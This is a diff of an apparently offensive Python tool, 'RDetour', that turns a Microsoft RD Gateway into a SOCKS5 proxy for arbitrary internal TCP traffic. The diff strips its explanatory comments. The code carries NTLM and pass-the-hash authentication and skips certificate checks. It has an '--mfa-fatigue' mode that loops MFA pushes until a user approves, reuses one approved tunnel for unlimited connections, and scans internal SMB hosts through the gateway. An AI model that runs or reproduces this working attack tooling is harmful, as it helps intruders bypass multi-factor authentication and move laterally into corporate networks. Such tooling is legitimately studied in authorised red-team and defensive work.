@@ -1,19 +1,11 @@
 #!/usr/bin/env python3
-"""
-RDetour — RD Gateway (MS-TSGU HTTP transport) to SOCKS5.
+"""RDetour — RD Gateway (MS-TSGU) to SOCKS5.
 
-One SOCKS CONNECT = one full tunnel (2 TLS legs + NTLM/EPA + channel), because
-the HTTP transport binds DATA packets to the tunnel's single channel.
-Protocol per [MS-TSGU] HTTP transport + FreeRDP libfreerdp/core/gateway/rdg.c.
+Exploits broad RAP (Resource Authorization Policy) to tunnel arbitrary TCP
+through an RD Gateway. One MFA push per tunnel lifetime, then unlimited
+proxied connections via channel cycling.
 
-  rdetour.py -g rdg.corp.com -u user -p pass                # SOCKS5 :1080
-  proxychains nxc smb 10.0.0.10 -u user -p pass
-  rdetour.py -g rdg.corp.com -u user -p pass --target 10.0.0.10:445 --probe smb
-  rdetour.py -g rdg.corp.com -u user -p pass --mfa-fatigue  # push loop until approved
-
-Auth: NTLM (password or --hashes LM:NT) wrapped in SPNEGO Negotiate with
-tls-server-end-point channel binding (EPA). TLS certs are not verified
-(gateway certs are commonly internal-CA or self-signed).
+Protocol per [MS-TSGU] HTTP transport, cross-checked against FreeRDP rdg.c.
 """
 import argparse
 import base64
@@ -31,22 +23,12 @@ import threading
 import time
 import uuid
 
-MAX_PACKET = 0x20000  # sane DATA packet ceiling (write chunks at 0xFFFF)
-CLOSE_GRACE_S = 0.4       # min seconds between channel close and next create —
-                          # the gateway races closer-spaced creates with its
-                          # server-side channel teardown (Server 2019 RDG)
-ABRUPT_CLOSE_GRACE_S = 2.0  # after a server-initiated/abrupt channel close the
-                            # teardown race window is seconds, not milliseconds
-SNIFF_S = 10.0     # max wait for a 445 client's first packet before giving up
-                   # on the connection — SMB clients always speak first
-STILLBORN_S = 3.0  # granted-but-silent window: live targets answer an SMB
-                   # negotiate in <100ms on this wire; silence past this is
-                   # the refused-port stillborn (wire matrix A1-A4) and the
-                   # tunnel is spent either way
-REFUSED_CACHE_TTL_S = 7 * 86400  # refused-445 classifications persist a week:
-                                 # a dead port does not come alive between
-                                 # scan runs, and re-proving it costs a tunnel
-                                 # (plus a Duo push for push-paying users)
+MAX_PACKET = 0x20000
+CLOSE_GRACE_S = 0.4
+ABRUPT_CLOSE_GRACE_S = 2.0
+SNIFF_S = 10.0
+STILLBORN_S = 3.0
+REFUSED_CACHE_TTL_S = 7 * 86400
 
 HRESULTS = {
     0x80070005: "E_ACCESSDENIED",
@@ -123,7 +105,6 @@ def chunk(b):
 
 
 def smb2_negotiate():
-    # SMB2 NEGOTIATE, dialects 0x0202-0x0300 — proves non-RDP TCP traverses.
     hdr = (b"\xfeSMB" + u16(64) + u16(0) + u32(0) + u16(0) + u16(0) +
            u32(0) + u32(0) + b"\x00" * 8 + u32(0xFEFF) + u32(0) +
            b"\x00" * 8 + b"\x00" * 16)
@@ -135,15 +116,8 @@ def smb2_negotiate():
 
 
 def channel_create_body(names, port, protocol):
-    """HTTP_CHANNEL_PACKET body (MS-TSGU) for 1..50 PRIMARY resource names.
-
-    numResources(1) numAltResources(1) port(2) protocol(2), then per name a
-    UINT16 byte-length + UTF-16 string. Multiple PRIMARY names act as a
-    pick-live list on Server 2019 RDG (wire-verified: [dead, live] grants
-    instantly on the live name; numAltResources entries are IGNORED for
-    connect fallback). This is what makes blind scanning survivable:
-    [target, 127.0.0.1] can never be denied while the gateway's own port
-    answers, so the tunnel (and its single MFA push) is never spent."""
+    """HTTP_CHANNEL_PACKET body per MS-TSGU. Multiple PRIMARY names use the
+    gateway's pick-live behavior: [target, 127.0.0.1] can never be denied."""
     if isinstance(names, str):
         names = [names]
     body = struct.pack("<BB", len(names), 0) + u16(port) + u16(protocol)
@@ -154,22 +128,15 @@ def channel_create_body(names, port, protocol):
 
 
 def smb2_server_guid(buf):
-    """ServerGUID (16 bytes) from an SMB2 NEGOTIATE response stream, else
-    None (short buffer or not SMB2). Layout: NBSS(4) + SMB2 hdr(64) +
-    structsize(2) secmode(2) dialect(2) ctxcount(2) -> GUID at [76:92].
-    Unique per host — the live-vs-gateway-loopback oracle."""
+    """ServerGUID from an SMB2 NEGOTIATE response, or None."""
     if len(buf) < 92 or buf[4:8] != b"\xfeSMB":
         return None
     return buf[76:92]
 
 
 def smb1_probe(buf):
-    """impacket's connection probe: an NBSS-framed SMB1 NEGOTIATE whose only
-    dialect is 'NT LM 0.12'. SMB1-disabled servers (Server 2019 default)
-    reset exactly this packet; impacket then reconnects multi-dialect and
-    proceeds — invisible when direct. Forwarded through RDG, that server RST
-    kills the whole tunnel (0x800759d8), so the warm server answers the
-    probe locally instead."""
+    """True if buf is impacket's single-dialect SMB1 negotiate probe.
+    Forwarded through RDG, the server RST kills the tunnel — answer locally."""
     if len(buf) < 36 or buf[0] != 0x00:            # NBSS session message
         return False
     if 4 + int.from_bytes(buf[1:4], "big") != len(buf):
@@ -180,8 +147,7 @@ def smb1_probe(buf):
 
 
 def rst(sock):
-    """Close with an RST instead of a FIN (SO_LINGER 0) — what a closed port
-    or an SMB1-disabled server does to the peer."""
+    """Close with RST (SO_LINGER 0)."""
     try:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                         struct.pack("ii", 1, 0))
@@ -194,7 +160,7 @@ def rst(sock):
 
 
 def tls_server_end_point_hash(der):
-    # RFC 5929: hash DER with the cert's signature alg; SHA-256 for MD5/SHA-1.
+    # RFC 5929 channel binding hash.
     try:
         from cryptography import x509
         from cryptography.hazmat.primitives import hashes
@@ -253,7 +219,6 @@ class RawTLS:
         return self.tls.recv(n)
 
     def read_http_response(self):
-        # Drain error bodies, never a 200 — that body IS the tunnel stream.
         while b"\r\n\r\n" not in self.buf:
             d = self.tls.recv(65536)
             if not d:
@@ -330,21 +295,13 @@ class ChunkedReader:
 
 
 class RDGTunnel:
-    """One tunnel = OUT leg (server->client) + IN leg (client->server) +
-    one channel to host:port. write()/read() carry the channel payload.
+    """One tunnel (OUT + IN TLS legs) with one channel at a time.
+    Authenticated once (MFA fires here), then channels cycle freely."""
 
-    Live-gateway verified (Server 2019 RDG): a tunnel is authenticated once
-    (tunnel-auth = the MFA push under per-auth MFA plugins) and carries
-    exactly ONE channel for its lifetime — a second CHANNEL_CREATE on a live
-    tunnel is ignored, and DATA packets carry no channel id, so there is no
-    in-protocol reuse or multiplexing. Reuse tunnels by keeping authed,
-    channel-less ones warm (see SocksServer pool)."""
-
-    # MS-TSGU extended-auth selectors (handshake packet + RDG-Auth-Scheme).
     EXT_AUTH_NONE = 0x0
-    EXT_AUTH_SC = 0x1        # smart card
-    EXT_AUTH_PAA = 0x2       # pluggable auth — PAA cookie in TUNNEL_CREATE
-    EXT_AUTH_SSPI_NTLM = 0x4  # NTLM tokens carried in EXT_AUTH_MSG packets
+    EXT_AUTH_SC = 0x1
+    EXT_AUTH_PAA = 0x2
+    EXT_AUTH_SSPI_NTLM = 0x4
 
     def __init__(self, gateway, gport=443, domain=None, user=None, password=None,
                  nthash=None, path="/remoteDesktopGateway/", client_name=None,
@@ -374,22 +331,16 @@ class RDGTunnel:
             self._cookies = []
         self.out_tls = self.in_tls = None
         self.out_reader = None
-        self.closed = False          # tunnel dead (TLS/RST/explicit close)
-        self.out_dead = False        # OUT TLS leg FIN/RST/errored (not timeout)
-        self.last_srv_close_reason = None  # reason HRESULT of gateway 0x10
-        self.last_close_ts = 0.0     # close->create grace bookkeeping
+        self.closed = False
+        self.out_dead = False
+        self.last_srv_close_reason = None
+        self.last_close_ts = 0.0
         self.last_close_abrupt = False
-        self.suspect = False         # a channel close ended dirty (no clean
-                                     # 0x11 handshake) — a later silent
-                                     # tunnel death is the previous channel's
-                                     # delayed kill, not this host's refusal
-        self.drain_saw_data = False  # DATA the tunnel consumed invisibly
-                                     # (close-drain / mid-body packet death)
-                                     # — the reader never saw it, but the
-                                     # target DID answer
-        self.channel_open = False    # a channel is live on this tunnel
-        self._srv_closed_channel = False  # gateway closed the channel itself
-        self._srv_close_ptype = None     # 0x10 (server-init) or 0x11 (our ack)
+        self.suspect = False
+        self.drain_saw_data = False
+        self.channel_open = False
+        self._srv_closed_channel = False
+        self._srv_close_ptype = None
         self._ka_stop = threading.Event()
         try:
             import spnego
@@ -406,8 +357,6 @@ class RDGTunnel:
         if self.verbose:
             print("[rdg]", *a, file=sys.stderr, flush=True)
 
-    # ---- HTTP legs ----
-
     def _request(self, method, auth_hdr=None, chunked=False):
         lines = [
             "%s %s HTTP/1.1" % (method, self.path),
@@ -423,9 +372,6 @@ class RDGTunnel:
         lines.append("Transfer-Encoding: chunked" if chunked
                      else "Content-Length: 0")
         if self.ext_auth != self.EXT_AUTH_NONE:
-            # Extended-auth modes carry credentials in the tunnel protocol
-            # (PAA cookie / SSPI_NTLM packets), never in an Authorization
-            # header; the selector rides in RDG-Auth-Scheme instead.
             schemes = {self.EXT_AUTH_PAA: "PAA",
                        self.EXT_AUTH_SSPI_NTLM: "SSPI_NTLM"}
             lines.append("RDG-Auth-Scheme: %s" % schemes[self.ext_auth])
@@ -443,13 +389,9 @@ class RDGTunnel:
 
     def _establish_leg(self, method):
         tls = RawTLS(self.gateway, self.gport)
-        # Pin the channel binding from the gateway cert BEFORE building the
-        # NTLM context — EPA-enforcing gateways RST unbound type3s.
         if tls.app_data and "app_data" not in self._cbt:
             self._cbt["app_data"] = tls.app_data
         if self.ext_auth != self.EXT_AUTH_NONE:
-            # No HTTP auth at all — RDG-Auth-Scheme tells the gateway the
-            # credentials arrive in the tunnel protocol (cookie or packets).
             tls.send(self._request(method))
             resp = tls.read_http_response()
             self._grab_cookies(resp)
@@ -491,12 +433,8 @@ class RDGTunnel:
                                   resp.all_headers("www-authenticate")))
         return tls, resp
 
-    # ---- tunnel establish ----
-
     def establish(self, auth_timeout=15):
-        """Legs + handshake + tunnel create/auth. This is the stage a
-        per-auth MFA plugin (Duo RDG) pushes at — one establish = one push.
-        No channel yet: the tunnel can sit warm until open_channel()."""
+        """Legs + handshake + tunnel create/auth. MFA fires here."""
         if self._cookies:
             self.log("session reuse: seeding %d cookies + conn %s"
                      % (len(self._cookies), self.conn_id[:8]))
@@ -509,7 +447,6 @@ class RDGTunnel:
             self.out_reader = self.out_tls
         self._skip_seed()
 
-        # IN leg (client -> server), then upgrade to chunked upload
         self.in_tls, _in_resp = self._establish_leg("RDG_IN_DATA")
         self.in_tls.send(self._request("RDG_IN_DATA", chunked=True))
 
@@ -526,16 +463,7 @@ class RDGTunnel:
         return self
 
     def open_channel(self, hosts, port, protocol=3):
-        """Bind the tunnel's single channel to host:port (RAP-checked, no
-        MFA — the push was paid at establish()). `hosts` may be a single
-        name or a list: a list rides the gateway's pick-live behavior
-        (see channel_create_body) — [target, '127.0.0.1'] cannot be denied
-        while the gateway itself answers the port."""
-        # A create fired soon after a close races the gateway's server-side
-        # channel teardown; after an ABRUPT close (server sent 0x10 first,
-        # e.g. when the SOCKS client vanished) the race window is seconds
-        # and a too-early create eats an instant tunnel RST (wire-observed
-        # with nxc). Wait it out.
+        """Bind the tunnel's channel to host:port. No MFA — just RAP check."""
         grace = (ABRUPT_CLOSE_GRACE_S if getattr(self, "last_close_abrupt",
                                                  False) else CLOSE_GRACE_S)
         gap = time.monotonic() - getattr(self, "last_close_ts", 0)
@@ -549,33 +477,19 @@ class RDGTunnel:
         return self
 
     def close_channel(self, timeout=8):
-        """Cleanly close the live channel so the SAME tunnel can carry a new
-        CHANNEL_CREATE (wire-verified on Server 2019 RDG: CLOSE_CHANNEL with
-        reason 0 is acked 0x11 and the next CHANNEL_CREATE to a different
-        target:port is granted). A DENIED CHANNEL_CREATE is not survivable —
-        the gateway RSTs the TLS legs — so call this only after a channel
-        that actually opened. Callers must ensure no reader thread is
-        polling the OUT stream: the ack races any concurrent recv."""
+        """CLOSE_CHANNEL(0) so the tunnel can carry a new CHANNEL_CREATE."""
         if not self.channel_open:
             return
         self.channel_open = False
         self._close_channel_xchg(timeout)
 
     def _close_channel_xchg(self, timeout=8):
-        """Raw CLOSE_CHANNEL(0) -> 0x11 exchange. Assumes exclusive access to
-        the OUT stream (no reader thread polling)."""
-        # Let any in-flight target data land first: a response arriving after
-        # the CLOSE makes the gateway abort the whole tunnel (0x800759d8,
-        # wire-observed as the delayed post-close kill). The client is gone
-        # by the time a close runs, so draining discards nothing it needs.
+        """CLOSE_CHANNEL(0) -> 0x11 ack. Drains in-flight data first."""
         for _ in range(2):
             dp = self.recv_packet(timeout=0.2)
             if dp is None:
                 break
             if dp[0] == 0xA:
-                # drained DATA: the target DID answer after all — a later
-                # zero-reader-data death on this tunnel must not classify
-                # the host refused
                 self.drain_saw_data = True
         try:
             self.send_packet(pkt(0x10, u32(0)))
@@ -585,15 +499,10 @@ class RDGTunnel:
             self.closed = True
             self.suspect = True
             raise RDGError("tunnel died closing channel: %r" % e)
-        # No 0x11 within the window: tunnel is suspect — mark it dead so the
-        # warm pool discards rather than reuses.
         if p is None or p[0] != 0x11:
             self.closed = True
             self.suspect = True
             raise RDGProtocolError("no close-channel ack — tunnel suspect")
-        # The gateway's server-side teardown lags the 0x11 ack: a create sent
-        # within ~100ms of a close is silently ignored (wire-observed with
-        # nxc's back-to-back connections) — callers wait out CLOSE_GRACE_S.
         self.last_close_ts = time.monotonic()
 
     def connect_tunnel(self, host, port, protocol=3, auth_timeout=15):
@@ -618,10 +527,7 @@ class RDGTunnel:
             self.out_tls.buf += d
 
     def _skip_seed(self):
-        # MS-TSGU 3.3.5.1 step 4: a fixed 10-byte random seed precedes the
-        # first packet (delivered with the 200). FreeRDP-compatible servers
-        # observed send exactly this. The handshake response only arrives
-        # AFTER the client sends its request, so never wait for it here.
+        # MS-TSGU 3.3.5.1: 10-byte random seed precedes the first packet.
         while len(self.out_tls.buf) < 10:
             try:
                 d = self._out_read_one(10 - len(self.out_tls.buf))
@@ -635,7 +541,6 @@ class RDGTunnel:
         self.log("seed skipped: %s" % seed.hex())
 
     def _handshake(self):
-        # 14 bytes: ver 1.0, clientVersion 0, extended-auth selector.
         self.send_packet(pkt(0x1, b"\x01\x00" + u16(0) + u16(self.ext_auth)))
         ptype, body = self._expect_packet(0x2)
         err = struct.unpack("<I", body[0:4])[0]
@@ -646,9 +551,6 @@ class RDGTunnel:
                  % (body[4], body[5], self.server_ext_auth))
 
     def _extauth_sspi_exchange(self):
-        """SSPI_NTLM: NTLM tokens inside EXT_AUTH_MSG (pkt 0x3) packets,
-        in-band after the handshake — legs carry no Authorization header.
-        Loop mirrors FreeRDP rdg_send/process_extauth_sspi."""
         user, secret, domain, spn_host = self._ident
         cb = (self._cb_cls(application_data=self._cbt["app_data"])
               if self._cbt.get("app_data") else None)
@@ -694,8 +596,6 @@ class RDGTunnel:
         self.send_packet(pkt(0x6, u16(0) + u16(len(name)) + name))
         p = self.recv_packet(timeout=auth_timeout)
         if p is None or p[0] != 0x7:
-            # No response at this stage = MFA push never approved (observed:
-            # fail-closed MFA hangs the tunnel-auth response).
             raise MfaNotApproved("tunnel auth: no response in %ds (MFA pending?)"
                                  % auth_timeout)
         err = struct.unpack("<I", p[1][0:4])[0]
@@ -711,8 +611,6 @@ class RDGTunnel:
         t0 = time.monotonic()
         self.send_packet(pkt(0x8, channel_create_body(names, port,
                                                       protocol)))
-        # 25s covers the ~21s Windows SYN-retransmit window, so a truly
-        # unroutable target usually yields the gateway's own verdict here.
         p = self.recv_packet(timeout=25)
         if p is None:
             if self.out_dead:
@@ -746,8 +644,6 @@ class RDGTunnel:
                                       else ""))
         return p
 
-    # ---- data plane ----
-
     def send_packet(self, raw):
         self.in_tls.send(chunk(raw))
 
@@ -764,9 +660,6 @@ class RDGTunnel:
         except socket.timeout:
             return None
         except (ConnectionError, ssl.SSLError, RDGProtocolError):
-            # OUT leg is DEAD (FIN/RST/TLS error), not merely quiet. Flag it
-            # so callers can tell a torn-down tunnel from a silent target,
-            # and so the warm pool discards the corpse instead of reusing it.
             self.out_dead = True
             self.closed = True
             return None
@@ -780,8 +673,6 @@ class RDGTunnel:
             try:
                 self._out_fill(plen - 8, timeout)
             except socket.timeout:
-                # the consumed header announced DATA — the body is still
-                # coming; the reader can never see this packet whole now
                 if ptype == 0xA:
                     self.drain_saw_data = True
                 return None
@@ -789,8 +680,6 @@ class RDGTunnel:
                 self.out_dead = True
                 self.closed = True
                 if ptype == 0xA:
-                    # mid-body DATA death: the answer existed, the reader
-                    # just never saw it
                     self.drain_saw_data = True
                 return None
             body = self.out_tls.buf[:plen - 8]
@@ -828,7 +717,6 @@ class RDGTunnel:
             try:
                 self.send_packet(pkt(0xD))
             except Exception:
-                # Tunnel is dead — mark it so the pool discards on take.
                 self.closed = True
                 return
 
@@ -844,19 +732,12 @@ class RDGTunnel:
                 t.close()
 
 
-# ---- SOCKS5 front end ----
-
 def say(*a):
     print(*a, file=sys.stderr, flush=True)
 
 
 def bridge_mode(args):
-    """Single-tunnel bridge: one MFA-paid tunnel, one channel, bridged to a
-    local listener. Pair with a multiplexing protocol so one approval serves
-    unlimited use, e.g.  rdetour --bridge 2222 --target 10.0.0.5:22 ...
-                          ssh -D 1080 -p 2222 user@127.0.0.1
-    A second bridge session would mean a second tunnel (and push), so the
-    bridge exits with the first client — keep one long-lived mux session."""
+    """Bridge one channel to a local port for SSH mux or similar."""
     host, port = args.target.rsplit(":", 1)
     lport = args.bridge
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -912,8 +793,7 @@ class SocksServer:
         self.args = args
         self.factory = tunnel_factory
         self.stats = {"opened": 0, "failed": 0, "pushes": 0}
-        self.establish_lock = threading.Lock()  # one tunnel setup at a time —
-        # parallel setups fire parallel MFA pushes and cause approval races
+        self.establish_lock = threading.Lock()
         self.mfa_gate = threading.Event()
         self.mfa_lock = threading.Lock()
         self.mfa_dead = False
@@ -1002,7 +882,6 @@ class SocksServer:
                 print("[fatigue] %s — next push in %ds" % (e, max(wait, 1)),
                       file=sys.stderr, flush=True)
                 time.sleep(max(wait, 1))
-            # other failures propagate — not fatigue-retryable
 
     def _connect(self, host, port, conn_id):
         a = self.args
@@ -1023,8 +902,6 @@ class SocksServer:
                     except RDGError:
                         self.mfa_dead = True
                         raise
-            # Gate open: each new tunnel still triggers a push under
-            # per-auth MFA — give the operator a window to approve each one.
             for i in range(3):
                 say("[conn %d] push sent for this connection — approve it "
                     "(%ds)" % (conn_id, a.mfa_auth_timeout))
@@ -1079,15 +956,7 @@ class SocksServer:
             self.fail(client, 0x02, "mfa not approved: %s" % e)
             if not self.mfa_hinted:
                 self.mfa_hinted = True
-                say("[hint] the gateway is MFA/CAP-gated. Each proxied "
-                    "connection = one approval; with per-auth MFA (e.g. Duo "
-                    "RD Gateway plugin) every new tunnel re-prompts.")
-                if not self.args.mfa_fatigue:
-                    say("[hint] retry with --mfa-fatigue to loop pushes on a "
-                        "cadence until approved.")
-                say("[hint] note: under FAIL-CLOSED MFA, users with no MFA "
-                    "enrollment are denied outright (win32 23003) — that is "
-                    "gateway policy, not a tool failure.")
+                say("[hint] gateway is MFA-gated — try --mfa-fatigue")
         except RDGPolicyError as e:
             self.stats["failed"] += 1
             self.fail(client, 0x02, "policy: %s" % e)
@@ -1142,10 +1011,6 @@ class SocksServer:
 
 
 def refused445_cache_path(gateway):
-    # one file per gateway as typed: sanitized for the filesystem plus a
-    # sha1(raw)[:8] tag so gateways that sanitize identically ("rdg a" vs
-    # "rdg-a") never share a cache; RDETOUR_CACHE_DIR overrides the default
-    # ~/.rdetour (test isolation only — the operator path stays stable)
     name = re.sub(r"[^a-z0-9.-]+", "-", gateway.lower())
     d = os.environ.get("RDETOUR_CACHE_DIR", os.path.expanduser("~/.rdetour"))
     return os.path.join(d, "refused445-%s-%s.json" %
@@ -1154,10 +1019,7 @@ def refused445_cache_path(gateway):
 
 
 def load_refused445(gateway):
-    """Hosts classified refused-on-445 for this gateway (persistent kill
-    cache). Missing file -> empty; corrupt file -> empty after one say();
-    entries older than REFUSED_CACHE_TTL_S are dropped and the file is
-    rewritten without them; future timestamps (clock skew) clamp to now."""
+    """Legacy v1 refused-445 cache loader. Used by migration and tests."""
     path = refused445_cache_path(gateway)
     try:
         with open(path, "r") as f:
@@ -1184,8 +1046,7 @@ def load_refused445(gateway):
 
 
 def save_refused445(gateway, entries):
-    """Atomic (mkstemp in the same dir + os.replace — two savers never
-    publish a half-written file); entries is host -> classified-at ts."""
+    """Legacy v1 cache writer. Atomic mkstemp + os.replace."""
     path = refused445_cache_path(gateway)
     os.makedirs(os.path.dirname(path), exist_ok=True)
     fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path),
@@ -1204,8 +1065,6 @@ def save_refused445(gateway, entries):
         raise
 
 
-# ---- generalized kill cache (any host:port) ----
-
 def kill_cache_path(gateway):
     name = re.sub(r"[^a-z0-9.-]+", "-", gateway.lower())
     d = os.environ.get("RDETOUR_CACHE_DIR", os.path.expanduser("~/.rdetour"))
@@ -1215,9 +1074,7 @@ def kill_cache_path(gateway):
 
 
 def load_kill_cache(gateway):
-    """host:port pairs classified as tunnel-killers for this gateway.
-    Loads the v2 killcache file; also migrates legacy v1 refused-445
-    entries as host:445.  TTL-expired entries are dropped on load."""
+    """Load kill cache, migrating legacy v1 entries if present."""
     entries = {}
     path = kill_cache_path(gateway)
     try:
@@ -1229,7 +1086,6 @@ def load_kill_cache(gateway):
         pass
     except (OSError, ValueError) as e:
         say("[warm] kill cache unreadable (%s) — starting empty" % e)
-    # migrate legacy v1 refused-445 entries
     try:
         with open(refused445_cache_path(gateway), "r") as f:
             doc = json.load(f)
@@ -1255,7 +1111,7 @@ def load_kill_cache(gateway):
 
 
 def save_kill_cache(gateway, entries):
-    """Atomic write. entries is {"host:port": classified-at-ts}."""
+    """Atomic write."""
     path = kill_cache_path(gateway)
     os.makedirs(os.path.dirname(path), exist_ok=True)
     fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path),
@@ -1275,56 +1131,19 @@ def save_kill_cache(gateway, entries):
 
 
 class WarmSocksServer(SocksServer):
-    """SOCKS5 over ONE MFA-paid tunnel, reused via the wire-verified channel
-    cycle CLOSE_CHANNEL(0) -> CHANNEL_CREATE. Every proxied connection is a
-    channel on the same authorized tunnel, so per-auth MFA (Duo RDG plugin)
-    is paid exactly once per tunnel lifetime, not per connection.
-
-    Constraints (live-gateway verified, Server 2019 RDG):
-    - exactly one channel at a time: connections are serialized (queued)
-    - a DENIED CHANNEL_CREATE (unreachable target 23005, RAP deny) RSTs the
-      tunnel -> next connection re-establishes and re-pays MFA; for port 445
-      the gateway-loopback fallback sidesteps this entirely: the create goes
-      out as [target, 127.0.0.1] (pick-live name list), so the gateway's own
-      SMB answers when the target cannot and the create is never denied;
-      the response's SMB ServerGUID then says whether the target or the
-      gateway answered (dead hosts get their SOCKS connection cut locally)
-    - if the TARGET closes or resets its socket while the channel is open
-      (protocol violation, invalid probe bytes, connection reuse the server
-      rejects — wire-verified: a 2nd SMB negotiate on one connection), the
-      gateway aborts the channel (0x10 reason 0x800759d8) AND tears down the
-      whole tunnel -> rebuild (+1 push for push users). Keep proxied
-      connections to a single request/response per connection (negotiate-
-      style scans) or one long-lived well-behaved session (SSH/RDP); the
-      always-running reader thread keeps client-side write patterns from
-      tripping the same abort.
-    - impacket/nxc open EVERY 445 connection with a single-dialect SMB1
-      negotiate probe; SMB1-disabled targets (Server 2019 default) RST it,
-      which is the killer above. The probe is answered LOCALLY with an RST
-      before any channel exists (clients reconnect multi-dialect — same as
-      direct), so it never touches the gateway.
-    - a GRANTED-but-silent channel (refused port — wire matrix A1-A4: any
-      create whose first name is a refused port) never delivers data, never
-      acks a close, and wedges the tunnel. Detected within STILLBORN_S of
-      the first client write: tunnel discarded, client reset, and the 445
-      host is answered locally (SOCKS refused) from then on — one tunnel
-      lost per refused host, not one per connection.
-    - TUNNEL_CLOSE / idle keepalive failure also end the tunnel
-    """
+    """SOCKS5 over one warm tunnel with channel cycling. One MFA push per
+    tunnel lifetime. Connections are serialized (one channel at a time)."""
 
     def __init__(self, args, tunnel_factory, scout_factory=None):
         SocksServer.__init__(self, args, tunnel_factory)
         self.tunnel = None
-        self.chan_lock = threading.Lock()   # one channel at a time
+        self.chan_lock = threading.Lock()
         self.tunnel_lock = threading.Lock()
-        # scout tunnel for probing unknown host:port pairs — expendable,
-        # auto-rebuilds on death so the warm tunnel never sees unknowns
         self.scout = None
         self.scout_factory = scout_factory or tunnel_factory
-        self.scout_lock = threading.Lock()       # one scout probe at a time
+        self.scout_lock = threading.Lock()
         self.scout_tunnel_lock = threading.Lock()
-        self.known_good = set()                  # "host:port" — session-scoped
-        # gateway-loopback fallback oracle (port 445)
+        self.known_good = set()
         self.gw_guid = None
         self.gw_guid_tried = False
         self.gw_ips = set()
@@ -1341,9 +1160,6 @@ class WarmSocksServer(SocksServer):
             (len(self.kill_cache), kill_cache_path(self.args.gateway)))
 
     def _abort(self, client, replied, code, msg):
-        """Fail a SOCKS client. After a success reply (the 445 sniff path)
-        a second SOCKS reply is garbage the client would read as target
-        bytes — hard-reset instead, exactly like a dying connection."""
         if replied:
             rst(client)
         else:
@@ -1362,9 +1178,7 @@ class WarmSocksServer(SocksServer):
         return self.gw_ips
 
     def _ensure_gw_guid(self, t):
-        """One loopback SMB cycle to learn the gateway's ServerGUID. With it,
-        any later [host, 127.0.0.1] channel whose SMB answer carries this
-        GUID actually landed on the gateway — i.e. the host is dead."""
+        """Learn the gateway's SMB ServerGUID via loopback for the dead-host oracle."""
         if self.gw_guid_tried:
             return self.gw_guid
         self.gw_guid_tried = True
@@ -1373,13 +1187,11 @@ class WarmSocksServer(SocksServer):
         if t.closed:
             return None
         if t.channel_open:
-            # a stuck-open channel would make the baseline create a
-            # create-with-live-channel (RST) — quiesce first
             try:
                 t.close_channel()
             except RDGError:
                 t.closed = True
-                t.suspect = True   # discarded without a clean handshake
+                t.suspect = True
                 return None
         try:
             t.open_channel(["127.0.0.1"], 445)
@@ -1416,8 +1228,8 @@ class WarmSocksServer(SocksServer):
             say("[warm] establishing tunnel — approve the ONE push "
                 "(window %ds)" % self.args.auth_timeout)
             t = self.factory(auth_timeout=self.args.auth_timeout)
-            t.suspect = False      # fresh tunnel: no dirty-close history —
-            self.tunnel = t        # only a SURVIVING tunnel keeps a mark
+            t.suspect = False
+            self.tunnel = t
             self.stats["pushes"] += 1
             say("[warm] tunnel live — channels from here on are free")
             return t
@@ -1439,9 +1251,7 @@ class WarmSocksServer(SocksServer):
             return s
 
     def _kill_remember(self, host, port, why):
-        """Classify host:port as a tunnel-killer and persist it: later
-        connections — this run or any inside the TTL — are refused locally.
-        Returns True only when the entry was newly added."""
+        """Persist host:port as tunnel-killer. Returns True if newly added."""
         key = "%s:%d" % (str(host).strip().lower(), port)
         with self.refused_lock:
             if key in self.kill_cache:
@@ -1486,13 +1296,6 @@ class WarmSocksServer(SocksServer):
                 return
             sniff = b""
             if port == 445:
-                # SMB clients speak first, so the probe is visible BEFORE any
-                # channel exists. impacket opens every connection with a
-                # single-dialect SMB1 negotiate that SMB1-disabled targets
-                # RST — and a forwarded RST kills the tunnel (0x800759d8).
-                # Answer the probe locally, exactly like such a server:
-                # impacket reconnects multi-dialect and proceeds. A silent
-                # 445 client (none known) is dropped after SNIFF_S.
                 self.reply(client, 0x00)
                 replied = True
                 client.settimeout(SNIFF_S)
@@ -1509,10 +1312,6 @@ class WarmSocksServer(SocksServer):
                     rst(client)
                     return
                 client.settimeout(None)
-            # Routing: 445-with-fallback → warm (loopback IS the scout),
-            # known-good → warm, unknown → scout tunnel.
-            # Check the HOST broadly: if any port on this host has been
-            # promoted, the host is live — don't waste a scout probe.
             no_scout = getattr(self.args, 'no_scout', False)
             host_known = any(k.startswith(h + ":") for k in self.known_good)
             is_scout = (not no_scout and not host_known
@@ -1539,7 +1338,6 @@ class WarmSocksServer(SocksServer):
                     use_fb = (port == 445 and not host_is_gw
                               and self._ensure_gw_guid(t) is not None)
                 if t.channel_open:
-                    # previous session's close never completed — best effort
                     try:
                         t.close_channel()
                     except RDGError:
@@ -1585,32 +1383,24 @@ class WarmSocksServer(SocksServer):
                      " (+gw fallback)" if use_fb else ""))
 
                 gw_guid = self.gw_guid
-                wrote = [None]         # first client->channel write time
-                life = [False]         # any channel data ever arrived
-                t.drain_saw_data = False   # per channel session: DATA the
-                                           # tunnel eats invisibly (drain /
-                                           # mid-body death) resets here
+                wrote = [None]
+                life = [False]
+                t.drain_saw_data = False
 
                 def reader():
-                    classified = not use_fb   # sniff only fallback channels
+                    classified = not use_fb
                     snif = b""
                     snif_t0 = None
                     try:
                         while not t.closed and t.channel_open:
-                            d = t.read(timeout=1)   # short poll: must notice
-                            if d:                   # channel_open flips fast
-                                life[0] = True      # so it can never steal
-                                if classified:      # the NEXT channel's data
+                            d = t.read(timeout=1)
+                            if d:
+                                life[0] = True
+                                if classified:
                                     say("[conn %d] reader: relay %d bytes" %
                                         (conn_id, len(d)))
                                     client.sendall(d)
                                     continue
-                                # Fallback channel: hold the first response
-                                # until we know whose it is. Gateway GUID =>
-                                # the target never answered and loopback won:
-                                # report the host dead by cutting the client
-                                # loose; anything else => real target answered
-                                # and the bytes relay normally.
                                 snif += d
                                 if snif_t0 is None:
                                     snif_t0 = time.monotonic()
@@ -1620,12 +1410,6 @@ class WarmSocksServer(SocksServer):
                                     say("[conn %d] %s:%d DEAD "
                                         "(landed on gateway loopback)" %
                                         (conn_id, host, port))
-                                    # dead and refused are the same verdict
-                                    # for an SMB scan, and the gateway's
-                                    # refused->loopback fallback is racy per
-                                    # hit (host .158 killed 1-of-3 observed
-                                    # contacts) — cached, later contacts are
-                                    # free AND immune to the race
                                     self._kill_remember(
                                         host, port, "gateway-loopback oracle")
                                     try:
